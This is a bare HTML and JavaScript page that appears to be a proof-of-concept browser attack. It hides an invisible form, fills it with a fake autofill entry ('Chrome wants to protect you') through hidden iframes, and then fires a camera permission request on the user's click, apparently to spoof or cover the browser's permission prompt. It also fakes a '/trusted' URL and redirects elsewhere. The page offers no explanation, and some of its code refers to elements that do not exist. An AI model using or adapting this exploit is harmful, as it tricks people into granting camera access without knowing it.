<style>
  #qform {
    position: absolute;
    top: -15px;
    left: 110px;
    opacity: 0;
  }
</style>

<form name="qform" id="qform" action="?t#faker" method="get">
  <input type="text" id="qb" name="qb" autofocus>
</form>

<h3 id="qmsg">Loading</h3>

<script>
  let msgs = 0;
  let iframes = [];

  function createAutofillEntry(str) {
    let aframe = document.createElement('iframe');
    aframe.src = '#faker';
    aframe.style = 'width:2px;height:3px;opacity:0.1';
    aframe['data-id'] = msgs;
    iframes[msgs] = false;
    msgs += 1;
    document.body.appendChild(aframe);

    aframe.onload = (e) => {
      if (e.target.contentWindow.location.search.length <= 10) {
        e.target.contentWindow.eval(`
          let thing = "${str}";
          let i = 0;
          let ger = setInterval(() => {
            qb.value += thing[i];
            i++;
            if (thing.length === i) {
              clearInterval(ger);
              qform.submit();
            }
          }, 30);
        `);
      } else {
        iframes[e.target['data-id']] = true;
      }
    };
  }

  if (location.hash === '#faker') {
    // Logic when hash is '#faker'
  } else if (location.hash === '#ok') {
    document.getElementById('qmsg').innerHTML = 'Click here';
    window.onclick = () => {
      navigator.mediaDevices.getUserMedia({ audio: false, video: { width: 1280, height: 720 } });
      setTimeout(() => {
        document.getElementById('qb').focus();
        document.execCommand('insertText', false, ' ');
      }, 150);
    };
  } else {
    createAutofillEntry(" Chrome wants to protect you");
    setInterval(() => {
      let allLoaded = iframes.every((frameStatus) => frameStatus === true);
      if (allLoaded) {
        console.log("yes");
        location.hash = '#ok';
        location.reload(true);
      }
    }, 500);
  }

  const trigger = document.getElementById('trigger');
  trigger.onclick = () => {
    history.pushState({}, '', '/trusted');
    document.getElementById('panel').style.display = 'block';
  };

  window.addEventListener('pageshow', () => {
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        setTimeout(() => {
          location.href = 'https://google.com:9090';
        }, 80);
      });
    });
  });
</script>
